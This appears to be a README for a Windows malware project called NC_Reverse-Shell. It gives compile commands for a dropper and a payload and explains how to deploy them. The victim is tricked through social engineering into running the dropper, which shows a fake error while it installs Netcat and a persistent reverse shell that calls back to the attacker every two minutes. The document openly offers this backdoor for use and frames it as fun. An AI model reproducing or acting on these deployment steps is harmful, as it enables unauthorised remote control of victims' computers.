# NC_Reverse-Shell
multi-use reverse shell utilizing Netcat. 

Target keeps requesting connection every 2 minutes until the attacker is ready

best if you compile with MinGW:
```
1. g++ dropper.cpp -o /bin/somename
2. g++ main.cpp -o /src/main
```

visual studio gave me shit

anyway.. just use some social engeneering and get them to click on the dropper which by default should be in /bin

and it will show a fake error so they think it was unsuccessful

then it will tranfer the files in /src which is "ncat.exe" and "main.exe" to their computer

the main file will launch every time they start their computer and continue running in the background

#### Have Fun!!
